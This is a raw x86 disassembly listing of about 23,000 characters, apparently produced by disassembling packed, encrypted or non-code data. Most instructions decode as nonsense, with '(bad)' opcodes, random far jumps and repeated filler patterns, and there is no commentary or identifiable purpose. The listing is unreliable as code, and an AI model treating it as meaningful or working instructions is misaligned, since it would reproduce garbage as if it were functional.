  411a15:	jecxz  0x411a48
  411a17:	dec    edx
  411a18:	add    al,0xff
  411a1a:	xor    DWORD PTR [ecx+ebp*1],ecx
  411a1d:	mov    BYTE PTR [ecx],cl
  411a1f:	cmp    eax,0x3d200724
  411a24:	jns    0x4119f5
  411a26:	lock push ebx
  411a28:	push   es
  411a29:	xor    ecx,ebp
  411a2b:	je     0x411a70
  411a2d:	adc    dl,0xce
  411a30:	aam    0x32
  411a32:	add    cl,ah
  411a34:	sub    cl,BYTE PTR [eax+0x1243cd9]
  411a3a:	add    BYTE PTR ds:0x370c779,bh
  411a40:	hlt    
  411a41:	xor    BYTE PTR [ecx-0x6d7fbc9c],al
  411a47:	jmp    0x882b:0xac96ff08
  411a4e:	add    BYTE PTR [eax],al
  411a50:	imul   edi,DWORD PTR [ecx+eiz*1+0x7abc400f],0xfdd370c7
  411a5b:	xor    BYTE PTR [ecx+0x74],ah
  411a5e:	inc    esp
  411a5f:	adc    BYTE PTR [edx-0x16],0xf8
  411a63:	push   cs
  411a64:	ss in  al,dx
  411a66:	sub    ecx,DWORD PTR [edx-0x1dbd0d0c]
  411a6c:	sub    eax,0x29883cec
  411a71:	jle    0x411a31
  411a73:	pop    es
  411a74:	sub    eax,0xa807be66
  411a79:	jmp    0x411a23
  411a7b:	pop    ebp
  411a7c:	fidiv  DWORD PTR [ebx+0x15]
  411a7f:	pop    esp
  411a80:	repz loop 0x411a84
  411a83:	push   ebx
  411a84:	jg     0x411aec
  411a86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a87:	and    ebp,DWORD PTR ds:0x4d737b21
  411a8d:	retf   
  411a8e:	lahf   
  411a8f:	test   BYTE PTR [edi],al
  411a91:	adc    al,0xf6
  411a93:	outs   dx,DWORD PTR ds:[esi]
  411a94:	loope  0x411ab6
  411a96:	xchg   ebp,eax
  411a97:	inc    edx
  411a98:	das    
  411a99:	test   eax,0x54a5b327
  411a9e:	fbstp  TBYTE PTR [ebx+0x84146d6]
  411aa4:	out    0x7b,eax
  411aa6:	movzx  esi,WORD PTR [ecx+0x14]
  411aaa:	aas    
  411aab:	cld    
  411aac:	(bad)  
  411aae:	cs clc 
  411ab0:	xchg   ecx,ebp
  411ab2:	mov    ebp,0xce0000b4
  411ab7:	push   edx
  411ab8:	and    DWORD PTR [eax],ecx
  411aba:	mov    edi,0x71b63f7b
  411abf:	adc    al,0xff
  411ac1:	bts    eax,esi
  411ac4:	push   es
  411ac5:	test   eax,0x3efd60b
  411aca:	add    al,0x9b
  411acc:	or     al,0xb3
  411ace:	out    0x44,al
  411ad0:	bound  edi,QWORD PTR [esi-0x7bb62ca]
  411ad6:	mov    ch,0x46
  411ad8:	fbstp  TBYTE PTR [edx+0x824fbee]
  411ade:	ja     0x411ad0
  411ae0:	aas    
  411ae1:	pop    esp
  411ae2:	cli    
  411ae3:	push   edx
  411ae4:	out    0x78,eax
  411ae6:	in     eax,dx
  411ae7:	jmp    0x411b00
  411ae9:	sbb    al,0x67
  411aeb:	out    dx,eax
  411aec:	mov    dh,0x7
  411aee:	into   
  411aef:	cmp    ebx,DWORD PTR [eax*8+0xc2c9f4e]
  411af6:	idiv   bl
  411af8:	nop
  411af9:	or     BYTE PTR [edi],bh
  411afb:	lock call FWORD PTR [ebx-0x1b]
  411aff:	push   edx
  411b00:	out    0x78,eax
  411b02:	jne    0x411af0
  411b04:	pop    ss
  411b05:	sbb    al,0xb
  411b07:	icebp  
  411b08:	jle    0x411b11
  411b0a:	and    DWORD PTR [ecx+0x5f252c00],0xffffffe8
  411b11:	imul   edi,DWORD PTR [ecx],0xffffffee
  411b14:	std    
  411b15:	ret    0xfb85
  411b18:	pop    ebx
  411b19:	sub    eax,DWORD PTR [eax]
  411b1b:	add    ch,bh
  411b1d:	out    dx,eax
  411b1e:	push   esp
  411b1f:	pusha  
  411b20:	push   eax
  411b21:	xchg   edx,eax
  411b22:	in     al,dx
  411b23:	stc    
  411b24:	mov    ds:0xeaa48949,eax
  411b29:	call   0x99f8:0x5859ed73
  411b30:	mov    ds:0x3632faf7,eax
  411b35:	out    dx,al
  411b36:	mov    ebp,DWORD PTR [edx+eiz*1-0x42d57ea1]
  411b3d:	inc    edx
  411b3e:	call   0xfe2f4547
  411b43:	or     DWORD PTR [edx],0x29e93f5b
  411b49:	pop    eax
  411b4a:	clc    
  411b4b:	cdq    
  411b4c:	cmp    al,BYTE PTR [esi+0x772ff6fc]
  411b52:	test   al,0x9d
  411b54:	jne    0x411b45
  411b56:	mov    WORD PTR [ebx*1+0x3670e85f],gs
  411b5d:	out    dx,al
  411b5e:	std    
  411b5f:	(bad)  
  411b60:	leave  
  411b61:	jmp    0x411aec
  411b63:	and    al,0x45
  411b65:	pushf  
  411b66:	inc    ebx
  411b67:	(bad)
  411b6a:	lock push ecx
  411b6c:	jge    0x411bce
  411b6e:	aas    
  411b6f:	jmp    0x1a39734d
  411b74:	sub    eax,0x2fa6fc7e
  411b79:	ja     0x411ba3
  411b7b:	sub    al,0x74
  411b7d:	out    dx,eax
  411b7e:	mov    WORD PTR [eax+eax*1],gs
  411b81:	add    BYTE PTR ds:0x3908e85f,bl
  411b87:	out    dx,al
  411b88:	std    
  411b89:	add    BYTE PTR [ebx+0x558bf9bc],ah
  411b8f:	or     BYTE PTR [eax+0x5c709c45],cl
  411b95:	lock xor BYTE PTR [eax+0x4c],dl
  411b99:	inc    ecx
  411b9a:	sbb    BYTE PTR [esp+eax*2-0x8],ch
  411b9e:	mov    eax,0x5ffc460a
  411ba3:	push   ss
  411ba4:	gs test al,0xcd
  411ba7:	xlat   BYTE PTR ds:[ebx]
  411ba8:	std    
  411ba9:	mov    WORD PTR [ebp+0x31e84d02],ss
  411baf:	sbb    al,0xfe
  411bb1:	push   DWORD PTR [esi-0x5707bb95]
  411bb7:	or     bl,ch
  411bb9:	sti    
  411bba:	movhps xmm0,QWORD PTR [edx-0x733f3f3a]
  411bc1:	inc    ebp
  411bc2:	sbb    BYTE PTR [ebx+0x1643d3e5],ah
  411bc8:	(bad)  
  411bc9:	pop    esi
  411bca:	shr    DWORD PTR [edi-0x17],cl
  411bcd:	pop    ebp
  411bce:	dec    edx
  411bcf:	jmp    0x411bce
  411bd1:	push   esp
  411bd2:	adc    DWORD PTR [eax+eax*4],esi
  411bd5:	in     al,dx
  411bd6:	in     al,dx
  411bd7:	pop    ss
  411bd8:	add    BYTE PTR [eax],al
  411bda:	dec    ebx
  411bdb:	mov    esi,0xf03d8b56
  411be0:	mov    dh,BYTE PTR [ebp-0x74]
  411be3:	test   BYTE PTR gs:[eax+0x187e0000],al
  411bea:	(bad)  
  411beb:	push   eax
  411bec:	adc    BYTE PTR [esi+0x0],0x0
  411bf0:	dec    eax
  411bf1:	mov    ebp,?
  411bf3:	xor    BYTE PTR [bp+0x40],ah
  411bf8:	jo     0x411c5c
  411bfa:	sti    
  411bfb:	dec    DWORD PTR [edi-0x3575303e]
  411c01:	iret   
  411c02:	dec    ebx
  411c03:	inc    ecx
  411c04:	xor    ebp,edi
  411c06:	jns    0x411c0b
  411c08:	arpl   WORD PTR [ecx],di
  411c0a:	jg     0x411c05
  411c0c:	cmp    DWORD PTR [edi],edx
  411c0e:	adc    esi,eax
  411c10:	mov    ah,0x13
  411c12:	push   es
  411c13:	(bad)  
  411c14:	push   ss
  411c15:	std    
  411c16:	add    DWORD PTR [eax],eax
  411c18:	xor    DWORD PTR [edx+0x650188b0],edx
  411c1e:	jge    0x411c93
  411c20:	dec    DWORD PTR [esi+0x3]
  411c23:	xor    bl,ah
  411c25:	push   edx
  411c26:	aam    0x8a
  411c28:	mov    ah,0xc7
  411c2a:	add    edi,esi
  411c2c:	out    0x64,al
  411c2e:	jge    0x411cab
  411c30:	fild   QWORD PTR [esi]
  411c32:	add    edi,esi
  411c34:	lods   al,BYTE PTR ds:[esi]
  411c35:	scas   eax,DWORD PTR es:[edi]
  411c36:	add    edi,esi
  411c38:	into   
  411c39:	jb     0x411cb0
  411c3b:	jnp    0x411c04
  411c3d:	add    ecx,DWORD PTR ss:[esi]
  411c40:	jg     0x411c3c
  411c42:	sbb    bh,0x36
  411c45:	jb     0x411c8c
  411c47:	jnp    0x411bf8
  411c49:	push   ds
  411c4a:	add    ecx,DWORD PTR [esi]
  411c4c:	add    BYTE PTR [eax],al
  411c4e:	(bad)  
  411c50:	shl    bh,cl
  411c52:	test   eax,0x31023bfc
  411c57:	mov    edx,0xf38b82bf
  411c5c:	xchg   BYTE PTR [ecx+esi*4],al
  411c5f:	xor    al,BYTE PTR [esi*2-0x1851da89]
  411c66:	or     al,ch
  411c68:	add    al,0xfe
  411c6a:	mov    dl,0x98
  411c6c:	mov    ebp,edi
  411c6e:	data16 (bad) 
  411c70:	add    DWORD PTR [eax-0x597104e6],eax
  411c76:	mov    dl,0x68
  411c78:	mov    ebp,edi
  411c7a:	dec    esi
  411c7b:	mov    esi,0x14a77501
  411c80:	je     0x411d00
  411c82:	mov    esi,0xe6049eed
  411c87:	sti    
  411c88:	push   cs
  411c89:	add    esi,DWORD PTR [ecx]
  411c8b:	adc    al,0x2e
  411c8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c8e:	mov    ebx,DWORD PTR [ebx+0x1bf0a693]
  411c94:	out    0xae,eax
  411c96:	test   eax,0xba1768f6
  411c9b:	adc    ah,bh
  411c9d:	add    esp,DWORD PTR [edx+0x46]
  411ca0:	mov    esi,0x721c5d78
  411ca5:	mov    gs,WORD PTR [edx]
  411ca7:	lahf   
  411ca8:	ins    BYTE PTR es:[edi],dx
  411ca9:	sub    esp,0xffffffec
  411cac:	dec    esi
  411cad:	mov    bl,0xce
  411caf:	in     al,dx
  411cb0:	out    0x3,eax
  411cb2:	add    BYTE PTR [eax],al
  411cb4:	xor    DWORD PTR [edx-0x19],edi
  411cb7:	fwait
  411cb8:	push   cs
  411cb9:	pop    esi
  411cba:	test   al,0x3
  411cbc:	fld    st(0)
  411cbe:	sub    al,0x4
  411cc0:	(bad)  
  411cc1:	and    bh,BYTE PTR [ecx]
  411cc3:	jns    0x411c75
  411cc5:	cmp    ebp,DWORD PTR [ebp-0x146b493e]
  411ccb:	shl    eax,1
  411ccd:	nop
  411cce:	adc    ebx,esi
  411cd0:	sub    ah,bl
  411cd2:	cs jle 0x411cfb
  411cd5:	out    dx,al
  411cd6:	inc    BYTE PTR [ebx]
  411cd8:	xor    DWORD PTR [edi+eiz*8],edx
  411cdb:	add    ebx,DWORD PTR [edx-0x46ec9fb9]
  411ce1:	xchg   esi,eax
  411ce2:	pop    ebx
  411ce3:	add    bh,BYTE PTR [edi-0x14]
  411ce6:	sbb    dh,dl
  411ce8:	mov    BYTE PTR [ebx],ah
  411cea:	bound  ecx,QWORD PTR [ecx+0x3ceede5]
  411cf0:	mov    ecx,0x5f024396
  411cf5:	in     al,dx
  411cf6:	mov    esi,0xeddd89
  411cfb:	mov    dh,0x32
  411cfd:	call   0xf6fd:0xee332d8b
  411d04:	jo     0x411d18
  411d06:	or     DWORD PTR [ecx+0x15bb9ab2],0xdefdea33
  411d10:	call   0xadc24c3e
  411d15:	jmp    0x411cda
  411d17:	jmp    0x6a42:0x55320000
  411d1e:	syscall 
  411d20:	jnp    0x411d06
  411d22:	mov    dl,0x2d
  411d24:	add    ah,bl
  411d26:	call   0x3392736d
  411d2b:	call   0xb7f7742d
  411d30:	js     0x411d81
  411d32:	xor    ch,dl
  411d34:	add    BYTE PTR [ecx+0x1e],ch
  411d37:	adc    al,0x73
  411d39:	xchg   BYTE PTR [esi+0x323778af],ch
  411d3f:	jmp    0x6983:0x9f90b400
  411d46:	xor    ebp,edx
  411d48:	std    
  411d49:	mov    ecx,0xe900b3ca
  411d4e:	xor    cl,BYTE PTR [ecx+0x5e]
  411d51:	mov    dl,0xb5
  411d53:	clc    
  411d54:	pop    ebx
  411d55:	sub    ebp,DWORD PTR ds:0xfb975114
  411d5b:	pushf  
  411d5c:	inc    esp
  411d5d:	int    0x22
  411d5f:	jb     0x411cea
  411d61:	lea    ecx,[esi+0x0]
  411d64:	data16 ins BYTE PTR es:[edi],dx
  411d66:	pop    edi
  411d67:	or     DWORD PTR [bx+si+0x68],esi
  411d6b:	lahf   
  411d6c:	js     0x411d67
  411d6e:	fsubr  DWORD PTR [ebp+0x1c57e8ff]
  411d74:	mov    eax,DWORD PTR [eax]
  411d76:	sbb    BYTE PTR [eax],al
  411d78:	test   edi,eax
  411d7a:	out    dx,al
  411d7b:	and    dl,dl
  411d7d:	sldt   WORD PTR [eax]
  411d80:	iret   
  411d81:	rcl    BYTE PTR [edx-0x7d],0x98
  411d85:	pop    ds
  411d86:	push   eax
  411d87:	call   0x3d0b58
  411d8c:	and    BYTE PTR [eax],bh
  411d8e:	dec    ecx
  411d8f:	inc    ecx
  411d90:	sbb    bh,bh
  411d92:	cmp    bh,cl
  411d94:	mov    bh,0x15
  411d96:	push   cs
  411d97:	mov    bh,0xd3
  411d99:	inc    ecx
  411d9a:	push   ebx
  411d9b:	call   0x3d0bb8
  411da0:	xor    BYTE PTR [eax-0xe7beb7],bh
  411da6:	es stc 
  411da8:	xchg   edi,eax
  411da9:	push   ss
  411daa:	push   cs
  411dab:	mov    bh,0x73
  411dad:	inc    edx
  411dae:	push   esi
  411daf:	call   0x3d0b58
  411db4:	xchg   edi,eax
  411db5:	je     0x411e0e
  411db7:	ret    0x16e0
  411dba:	dec    edi
  411dbb:	mov    esi,DWORD PTR [edx+esi*1+0x1a705308]
  411dc2:	cmc    
  411dc3:	call   DWORD PTR [edi]
  411dc5:	nop
  411dc6:	mov    edi,0x16c880
  411dcb:	mov    eax,0x3d43e0
  411dd0:	adc    eax,DWORD PTR [edi]
  411dd2:	test   DWORD PTR [ebx],edx
  411dd4:	sbb    edx,edi
  411dd6:	add    al,0x83
  411dd8:	dec    ebx
  411dd9:	adc    edi,DWORD PTR [ecx]
  411ddb:	test   al,0xc5
  411ddd:	dec    edi
  411dde:	add    BYTE PTR [edx+0x37],dh
  411de1:	scas   eax,DWORD PTR es:[edi]
  411de2:	test   al,0x4d
  411de4:	add    BYTE PTR [eax],al
  411de6:	fst    DWORD PTR [esi]
  411de8:	xchg   DWORD PTR [eax],edx
  411dea:	add    DWORD PTR [ecx],eax
  411dec:	jg     0x411dae
  411dee:	mov    WORD PTR [edi+0x3104bf],cs
  411df4:	sub    al,0x4e
  411df6:	lock cld 
  411df8:	jae    0x411de7
  411dfa:	cli    
  411dfb:	mov    esi,0x66020008
  411e00:	pusha  
  411e01:	and    al,0x39
  411e03:	push   cs
  411e04:	in     al,dx
  411e05:	call   0x8040d753
  411e0a:	jb     0x411e88
  411e0c:	add    al,0x0
  411e0e:	xor    DWORD PTR [ebp+0x2c],esi
  411e11:	dec    ebx
  411e12:	jo     0x411e0f
  411e14:	mov    WORD PTR [ecx],ss
  411e16:	mov    eax,0x35c184eb
  411e1b:	jle    0x411de1
  411e1d:	add    al,0x54
  411e1f:	inc    ebx
  411e20:	dec    ebp
  411e21:	aas    
  411e22:	xor    ebp,ebp
  411e24:	lock mov eax,0x4108d9
  411e2a:	stos   BYTE PTR es:[edi],al
  411e2b:	out    dx,al
  411e2c:	mov    dl,BYTE PTR [eax]
  411e2e:	mov    dl,0x3e
  411e30:	or     BYTE PTR [ecx+0x283ef7f1],al
  411e36:	ja     0x411df4
  411e38:	add    DWORD PTR [edx-0x32],esi
  411e3b:	mov    dh,0xc3
  411e3d:	add    al,0x31
  411e3f:	or     BYTE PTR [edx+0x1c4fb2e3],0x51
  411e46:	pop    edi
  411e47:	jbe    0x411ea6
  411e49:	or     BYTE PTR [eax],al
  411e4b:	add    BYTE PTR [edx+0x6c8b0d88],ch
  411e51:	xor    edx,DWORD PTR [ecx+edx*2-0x67]
  411e55:	adc    ah,bh
  411e57:	std    
  411e58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e59:	dec    eax
  411e5a:	inc    ebp
  411e5b:	lock add DWORD PTR [eax+0x43],esp
  411e5f:	or     BYTE PTR [ecx],al
  411e61:	add    esp,esp
  411e63:	clc    
  411e64:	mov    fs,edx
  411e66:	mov    es,WORD PTR [ebx-0x67]
  411e69:	mov    eax,DWORD PTR [ecx+eax*8-0x13c5ebdf]
  411e70:	pusha  
  411e71:	in     al,dx
  411e72:	fiadd  WORD PTR [eax]
  411e74:	fdivr  DWORD PTR [ebx-0x68cebcdd]
  411e7a:	and    al,0xfc
  411e7c:	add    esp,edi
  411e7e:	inc    esp
  411e7f:	sti    
  411e80:	push   esp
  411e81:	jmp    0x533ecad5
  411e86:	out    0x8e,eax
  411e88:	repnz jecxz 0x411ea2
  411e8b:	in     al,dx
  411e8c:	int3   
  411e8d:	jmp    0x432b:0xbbc800a6
  411e94:	xor    DWORD PTR [edi-0x37e13d4],edx
  411e9a:	or     bl,bh
  411e9c:	sbb    al,0xe9
  411e9e:	jb     0x411efe
  411ea0:	adc    eax,0xb6f4249d
  411ea5:	dec    esi
  411ea6:	jae    0x411e32
  411ea8:	push   0xffffffe4
  411eaa:	bound  ebx,QWORD PTR [esi+0x5]
  411ead:	popf   
  411eae:	lods   al,BYTE PTR ds:[esi]
  411eaf:	jmp    0x411eb1
  411eb1:	add    BYTE PTR [esi-0x7575acb2],ch
  411eb7:	cld    
  411eb8:	mov    edi,0xe7537a2b
  411ebd:	mov    ?,WORD PTR [edx-0x14]
  411ec0:	xchg   edi,eax
  411ec1:	jmp    0x411edb
  411ec3:	jmp    0x411f03
  411ec5:	add    BYTE PTR [eax+0x3c],bl
  411ec8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ec9:	inc    edx
  411eca:	xor    DWORD PTR [edi-0x39e0c5c],edx
  411ed0:	aam    0xfa
  411ed2:	mov    ah,0xe8
  411ed4:	(bad)  
  411ed5:	sub    edi,edx
  411ed7:	push   edx
  411ed8:	out    0x8e,eax
  411eda:	repnz sti 
  411edc:	mov    bh,0xeb
  411ede:	cmp    al,0xeb
  411ee0:	push   es
  411ee1:	add    BYTE PTR [ebx-0xd7404ba],ch
  411ee7:	jecxz  0x411ee9
  411ee9:	pusha  
  411eea:	out    dx,eax
  411eeb:	out    0x87,eax
  411eed:	mov    WORD PTR [edx-0x5522a466],es
  411ef3:	push   esp
  411ef4:	call   0x88211769
  411ef9:	xor    al,0x55
  411efb:	jnp    0x411ea5
  411efd:	sbb    al,0xf4
  411eff:	adc    ecx,DWORD PTR [ebx-0x17bcaad4]
  411f05:	ror    BYTE PTR [ebp-0x1a],0xfd
  411f09:	inc    ecx
  411f0a:	xchg   ebp,eax
  411f0b:	pop    esp
  411f0c:	aas    
  411f0d:	jmp    0x3a3173b3
  411f12:	inc    ebp
  411f13:	cli    
  411f14:	clc    
  411f15:	sahf   
  411f16:	add    BYTE PTR [eax],al
  411f18:	cs jge 0x411ec3
  411f1b:	and    al,0x6c
  411f1d:	adc    al,0x8b
  411f1f:	and    al,0xd
  411f21:	inc    ebp
  411f22:	call   0xfe2b34cb
  411f27:	pop    ss
  411f28:	mov    al,ds:0x1519f853
  411f2d:	xchg   ecx,eax
  411f2e:	clc    
  411f2f:	outs   dx,BYTE PTR ds:[esi]
  411f30:	(bad)  
  411f31:	fwait
  411f32:	inc    esi
  411f33:	icebp  
  411f34:	bound  ebx,QWORD PTR [ebx-0x37aa6bd]
  411f3a:	jne    0x411f8d
  411f3c:	out    0xe9,al
  411f3e:	and    DWORD PTR [edi],0xac8b3e45
  411f44:	retf   0xe844
  411f47:	ror    edx,cl
  411f49:	jmp    0x8facb74b
  411f4e:	in     al,dx
  411f4f:	mov    eax,?
  411f51:	sbb    al,0x0
  411f53:	mov    esp,0xd7ff3a5
  411f58:	shl    edi,0xfd
  411f5b:	jmp    0x62965d63
  411f60:	adc    BYTE PTR [ecx+ecx*4],bl
  411f63:	add    BYTE PTR ds:0x18858917,dl
  411f69:	out    0xfb,al
  411f6b:	jmp    FWORD PTR [eax-0x7001ab05]
  411f71:	out    0x6a,al
  411f73:	add    al,ah
  411f75:	aaa    
  411f76:	dec    esi
  411f77:	inc    ecx
  411f78:	pop    eax
  411f79:	sti    
  411f7a:	in     eax,0xfd
  411f7c:	add    BYTE PTR [eax],al
  411f7e:	jg     0x411f66
  411f80:	sub    eax,0x2894d2d2
  411f85:	dec    esi
  411f86:	or     DWORD PTR [eax],edx
  411f88:	mov    BYTE PTR [edx+ecx*2],al
  411f8b:	push   ebp
  411f8c:	jg     0x411f88
  411f8e:	pusha  
  411f8f:	addr16 in eax,dx
  411f91:	(bad)  
  411f92:	aad    0x6a
  411f94:	(bad)  
  411f95:	dec    DWORD PTR [edi+0x18000010]
  411f9b:	cli    
  411f9c:	push   esp
  411f9d:	mov    eax,ecx
  411f9f:	xchg   edi,eax
  411fa0:	xor    DWORD PTR [esi+ebp*4-0x1b],0xf9ba31fb
  411fa8:	xor    BYTE PTR [ebx-0x1a06b],cl
  411fae:	jg     0x411f48
  411fb0:	cmp    DWORD PTR [esi+ecx*4-0x1a],0x5f85fffb
  411fb8:	(bad)  
  411fb9:	dec    DWORD PTR [edi+0x7e7c899a]
  411fbf:	out    0xfb,al
  411fc1:	ldmxcsr DWORD PTR [ecx]
  411fc4:	jg     0x411fa6
  411fc6:	out    dx,eax
  411fc7:	cdq    
  411fc8:	mov    ecx,0xfbe60e7c
  411fcd:	cmovbe esp,DWORD PTR [esi]
  411fd0:	sub    eax,0xc61050f8
  411fd5:	add    ecx,eax
  411fd7:	push   ecx
  411fd8:	inc    edx
  411fd9:	adc    DWORD PTR [edx+0xb],0x79
  411fdd:	add    eax,0x3a7d31
  411fe2:	add    BYTE PTR [eax],al
  411fe4:	and    al,0x2f
  411fe6:	push   ebx
  411fe7:	push   esi
  411fe8:	mov    DWORD PTR [ebx+edi*8-0x57867103],ebx
  411fef:	js     0x411f78
  411ff1:	(bad)  
  411ff3:	add    BYTE PTR [ecx-0x318cfe5f],dh
  411ff9:	jns    0x411fb8
  411ffb:	js     0x41206c
  411ffd:	(bad)  
  412000:	fcomp  QWORD PTR [esi-0x73]
  412003:	xor    DWORD PTR [ecx+0x1fdfbd6],0xffffffc5
  41200a:	(bad)  
  41200b:	sti    
  41200c:	dec    esi
  41200d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41200e:	pop    ebx
  41200f:	pop    esi
  412010:	jmp    0x1f4:0x735bf073
  412017:	push   ebx
  412018:	test   al,0x97
  41201a:	push   esp
  41201b:	push   eax
  41201c:	sbb    BYTE PTR ds:0x72395387,0x5d
  412023:	or     al,0xaa
  412025:	add    BYTE PTR [edi+ebp*1],dl
  412028:	call   0xb950288e
  41202d:	das    
  41202e:	or     eax,0x12f7bbf8
  412033:	mov    BYTE PTR ds:0xf88142c4,dh
  412039:	jecxz  0x4120b8
  41203b:	jmp    0x411fbf
  41203d:	test   eax,0x3eebace9
  412042:	sti    
  412043:	das    
  412044:	add    ecx,DWORD PTR [ecx+0x10]
  412047:	sbb    al,BYTE PTR [eax]
  412049:	add    BYTE PTR [ebx+0x30322ff7],ch
  41204f:	arpl   WORD PTR [ecx],ax
  412051:	inc    edx
  412052:	mov    dl,0x21
  412054:	or     al,0x7c
  412056:	shr    esp,0xcf
  412059:	mov    ch,BYTE PTR [ebp+0x14]
  41205c:	cld    
  41205d:	sti    
  41205e:	mov    ecx,0xb041d910
  412063:	jmp    0x8ab2:0x46a07fdf
  41206a:	test   DWORD PTR [edi+0x29],eax
  41206d:	adc    BYTE PTR [ecx],dh
  41206f:	adc    al,0xe7
  412071:	add    esi,DWORD PTR [ecx]
  412073:	adc    al,0xe7
  412075:	add    esi,DWORD PTR [ecx]
  412077:	adc    al,0xe7
  412079:	add    esi,DWORD PTR [ecx]
  41207b:	adc    al,0xe7
  41207d:	add    esi,DWORD PTR [ecx]
  41207f:	adc    al,0xe7
  412081:	add    esi,DWORD PTR [ecx]
  412083:	adc    al,0xe7
  412085:	add    esi,DWORD PTR [ecx]
  412087:	adc    al,0xe7
  412089:	add    esi,DWORD PTR [ecx]
  41208b:	adc    al,0xe7
  41208d:	add    esi,DWORD PTR [ecx]
  41208f:	adc    al,0xe7
  412091:	add    esi,DWORD PTR [ecx]
  412093:	adc    al,0xe7
  412095:	add    esi,DWORD PTR [ecx]
  412097:	adc    al,0xe7
  412099:	add    esi,DWORD PTR [ecx]
  41209b:	adc    al,0xe7
  41209d:	add    esi,DWORD PTR [ecx]
  41209f:	adc    al,0xe7
  4120a1:	add    esi,DWORD PTR [ecx]
  4120a3:	adc    al,0xe7
  4120a5:	add    esi,DWORD PTR [ecx]
  4120a7:	adc    al,0xe7
  4120a9:	add    esi,DWORD PTR [ecx]
  4120ab:	adc    al,0xe7
  4120ad:	add    eax,DWORD PTR [eax]
  4120af:	add    BYTE PTR [ecx],dh
  4120b1:	adc    al,0xe7
  4120b3:	add    esi,DWORD PTR [ecx]
  4120b5:	adc    al,0xe7
  4120b7:	add    esi,DWORD PTR [ecx]
  4120b9:	adc    al,0xe7
  4120bb:	add    esi,DWORD PTR [ecx]
  4120bd:	adc    al,0xe7
  4120bf:	add    esi,DWORD PTR [ecx]
  4120c1:	adc    al,0xe7
  4120c3:	add    esi,DWORD PTR [ecx]
  4120c5:	adc    al,0xe7
  4120c7:	add    esi,DWORD PTR [ecx]
  4120c9:	adc    al,0xe7
  4120cb:	add    esi,DWORD PTR [ecx]
  4120cd:	adc    al,0xe7
  4120cf:	add    esi,DWORD PTR [ecx]
  4120d1:	adc    al,0xe7
  4120d3:	add    esi,DWORD PTR [ecx]
  4120d5:	adc    al,0x0
  4120d7:	jmp    0xe941350e
  4120dc:	xor    dl,BYTE PTR [eax+eax*1]
  4120df:	jmp    0xe9413516
  4120e4:	xor    dl,BYTE PTR [eax+eax*1]
  4120e7:	in     al,0x28
  4120e9:	sbb    DWORD PTR [edx],ecx
  4120eb:	mov    BYTE PTR [edx],al
  4120ed:	pop    eax
  4120ee:	mov    edx,DWORD PTR [bp+si+0x5e]
  4120f2:	das    
  4120f3:	iret   
  4120f4:	inc    edx
  4120f5:	xor    eax,0x344fc920
  4120fa:	and    BYTE PTR [ebp+0xa],dh
  4120fd:	jno    0x41211f
  4120ff:	pop    edx
  412100:	fadd   DWORD PTR [esp+ebp*2+0x4d]
  412104:	shl    BYTE PTR [ecx+0x20],1
  412107:	pop    ebp
  412108:	int    0x70
  41210a:	and    BYTE PTR [ebx-0x30],cl
  41210d:	pop    edi
  41210e:	je     0x41215c
  412110:	(bad)  
  412111:	xor    edi,DWORD PTR [edx]
  412113:	adc    BYTE PTR [eax],al
  412115:	add    BYTE PTR [eax],bh
  412117:	sbb    al,BYTE PTR [ecx+0x46]
  41211a:	lds    ebx,FWORD PTR [edx+esi*2+0x40]
  41211e:	sar    BYTE PTR [ebx+0x74],cl
  412121:	leave  
  412122:	pop    edx
  412123:	jne    0x41214c
  412125:	leave  
  412126:	pop    ebp
  412127:	sub    esi,DWORD PTR [edi]
  412129:	ror    DWORD PTR [ecx+0x26],1
  41212c:	xor    cl,bl
  41212e:	push   ebp
  41212f:	xor    al,0x62
  412131:	add    BYTE PTR [ebp+0x4e],dl
  412134:	ins    DWORD PTR es:[edi],dx
  412135:	add    al,0x7f
  412137:	jns    0x41219c
  412139:	pop    es
  41213a:	push   ebp
  41213b:	pop    ebx
  41213c:	(bad)  
  41213d:	cli    
  41213e:	xchg   ecx,eax
  41213f:	jb     0x41216d
  412141:	or     DWORD PTR [eax+esi*2+0x6c],esi
  412145:	or     DWORD PTR [edi+0x7b],edi
  412148:	ror    DWORD PTR gs:[esi+0x65],0x20
  41214d:	mov    ebx,0x636551
  412152:	mov    ah,BYTE PTR [ebp+0x61]
  412155:	fs ss or eax,0x4cd20d0a
  41215c:	imul   esi,DWORD PTR [edx-0x13],0x37
  412160:	outs   dx,BYTE PTR gs:[esi]
  412162:	mov    esi,0xb96d726e
  412167:	jae    0x4121ce
  412169:	outs   dx,DWORD PTR ds:[esi]
  41216a:	mov    dh,0x21
  41216c:	and    BYTE PTR [eax-0x44],ch
  41216f:	jae    0x4121e1
  412171:	cmp    ah,BYTE PTR [edi+0x2e]
  412174:	jae    0x4121ed
  412176:	jmp    FWORD PTR [eiz*2-0x4ffff9e]
  41217d:	jae    0x4121ed
  41217f:	jae    0x412178
  412181:	je     0x4121f7
  412183:	ja     0x41217e
  412185:	imul   esp,DWORD PTR [ecx+0x2e],0x2f696efb
  41218c:	push   ebp
  41218d:	adc    DWORD PTR [ecx],ecx
  41218f:	or     cl,BYTE PTR [eax+0x17]
  412192:	add    BYTE PTR [eax],al
  412194:	pop    eax
  412195:	pop    ss
  412196:	add    BYTE PTR [eax],al
  412198:	pop    eax
  412199:	pop    ss
  41219a:	add    BYTE PTR [eax],al
  41219c:	dec    eax
  41219d:	pop    ss
  41219e:	add    BYTE PTR [eax],al
  4121a0:	dec    eax
  4121a1:	pop    ss
  4121a2:	add    BYTE PTR [eax],al
  4121a4:	sbb    BYTE PTR [edi],dl
  4121a6:	add    BYTE PTR [eax],al
  4121a8:	sbb    BYTE PTR [edi],dl
  4121aa:	add    BYTE PTR [eax],al
  4121ac:	or     BYTE PTR [edi],dl
  4121ae:	add    BYTE PTR [eax],al
  4121b0:	or     BYTE PTR [edi],dl
  4121b2:	add    BYTE PTR [eax],al
  4121b4:	sbb    BYTE PTR [edi],dl
  4121b6:	add    BYTE PTR [eax],al
  4121b8:	sbb    BYTE PTR [edi],dl
  4121ba:	add    BYTE PTR [eax],al
  4121bc:	or     BYTE PTR [edi],dl
  4121be:	add    BYTE PTR [eax],al
  4121c0:	or     BYTE PTR [edi],dl
  4121c2:	add    BYTE PTR [eax],al
  4121c4:	fcom   DWORD PTR [esi]
